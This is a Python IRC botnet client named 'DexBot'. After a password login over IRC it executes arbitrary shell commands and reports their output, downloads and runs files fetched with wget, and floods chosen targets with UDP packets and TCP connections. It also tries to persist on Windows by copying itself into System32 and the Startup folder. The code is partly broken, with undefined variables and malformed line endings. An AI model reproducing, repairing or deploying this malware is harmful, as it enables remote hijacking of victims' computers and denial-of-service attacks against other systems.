#!/usr/bin/env python
import socket
import math
import os
import sys
import time
import string
import random
import commands
import threading

from threading import Thread
from re import search

chars = string.letters + string.digits
pwdSize = 5

#Configure The IRC
server = 'irc.freenode.net'
port = 8001
chan = '#chaned'
extra = ''.join((random.choice(chars)) for x in range(pwdSize))
nick = 'DexBot'+extra
password = 'SPIKE244'
ex = "!"
login = False
msgt = ''
msgti = ''
msgp = 1
typeos = ''
thread_limit = 150

# Create A Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))
s.send('NICK %s\r\n' %nick)
s.send('USER ' + nick + ' ' + nick + ' ' + nick + ' .:\n')
s.send('Join %s\r\n' %chan)
#time.sleep(2)
#print (s.recv(1024))

def isinfected():
  if (typeos=='posix'):
    if (os.path.exists('/tmp/'+sysName)==True):
      pass
    else:
      pass
      #os.system('sudo mv '+sys.argv[0]+' /tmp/'+sysName+'&& chmod 755 '+sysName+' && screen ./'+sysName)
      #os.system('sudo mv '+sys.argv[0]+' /etc/rc.d/'+sysName+' && chmod 755 '+sysName)
  elif (typeos=='nt'):
     if (os.path.exists('C://Windows/System32/'+sysName+'.exe')==True):
      pass
     elif (os.path.exists('C://Windows/System32/'+sysName+'.exe')==False):
      os.rename(sys.argv[0], ' ,C://Windows/System32'+sysName+'.exe')
      os.system('C://Window/System32/'+sysName+'.exe')
      os.rename('C://ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/'+sysName+'.exe')

def command(msg):
    if msg[0:4] == 'PING':
        s.send(msg.replace('PING', 'PONG'))
    if (login==True):
      msg = msg.split(ex+'command')
      msg = msg[1].split('\r\n')
      os.system(msg[0])
      show = commands.getstatusoutput(msg[0])
      s.send('PRIVMSG %s : Command [ %s ] executed successfully!\r\n' %(chan, str(msg[0])))
      s.send('PRIVMSG %s : Command Output %r!\r\n' %(chan, show))
    else:
      s.send('PRIVMSG %s : You Must Login To Send Commands\r\n' %(chan))

def dlE(msg): # To download and execute files from direct downloads
    if msg[0:4] == 'PING':
        s.send(msg.replace('PING', 'PONG'))
    if (login==True):
      msg = msg.split(ex+'dlE')
      msg = msg[1].split('/r/n')
      os.system("cd /tmp && wget -q -O "+fileName+" "+msg[0]+" && chmod 755 "+fileName+" && ./"+fileName)
      s.send('PRIVMSG %s : File [ %s ] downloaded and executed successfully!/r/n' %(chan, fileName))
    else:
      s.send('PRIVMSG %s : You Must Login To Send Commands/r/n' %(chan))

def udp(msg): #def would be the same as void in C but in python we say def
  if (login==True):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(4096)

    msg = msg.split(ex+'udp')
    msg = msg[1].split('\r\n')
    msg = msg[0].split(' ')
    msgt = msg[0]
    msgti = float(msg[2])
    timeout =  time.time() + msgti
    sent = 0
    msgp = 1

    while 1:
      if msg[0:4] == 'PING':
          s.send(msg.replace('PING', 'PONG'))
      if time.time() > timeout:
          break
      else:
          pass
      client.sendto(bytes, (msgt, msgp))
      sent = sent + 1
      msgp = msgp + 1
      if msgp == 65535:
          msgp = 1
  else:
    s.send('PRIVMSG %s : You Must Login To Send Commands\r\n' %(chan))

def tcp(msg): #def would be the same as void in C but in python we say def
  if (login==True):
    msg = msg.split(ex+'tcp')
    msg = msg[1].split('\r\n')
    msg = msg[0].split(' ')
    msgt = msg[0]
    msgti = float(msg[2])
    timeout =  time.time() + msgti
    msgp = 1
    class sendSYN(threading.Thread):
	#global msgt, msgp
	def __init__(self):
	 threading.Thread.__init__(self)
	def run(self):
            while 1:
              if (msg[0:4] == 'PING'):
                s.send(msg.replace('PING', 'PONG'))
              if time.time() > timeout:
                break
              else:
                pass
	      tcps = socket.socket()
	      tcps.connect((msgt,msgp))
    while True:
	 if threading.activeCount() < thread_limit: 
             sendSYN().start()
      	     msgp = msgp + 1
      	     if (msgp == 65535):
            	msgp = 1

  else:
    s.send('PRIVMSG %s : You Must Login To Send Commands\r\n' %(chan))

isinfected()
while True:
    msg = s.recv(5000)
    #print (msg)
    if msg[0:4] == 'PING':
        s.send(msg.replace('PING', 'PONG'))
    elif search(ex+'login %s' %password, msg):
        login = True
        s.send('PRIVMSG %s : Logged In Successfully!\r\n' %chan)
    elif search(ex+'command', msg):
        command(msg)
    elif search(ex+'udp', msg):
        udp(msg)
    elif search(ex+'dle', msg):
        dlE(msg)
    elif search(ex+'tcp', msg):
        tcp(msg)
    else:
        pass
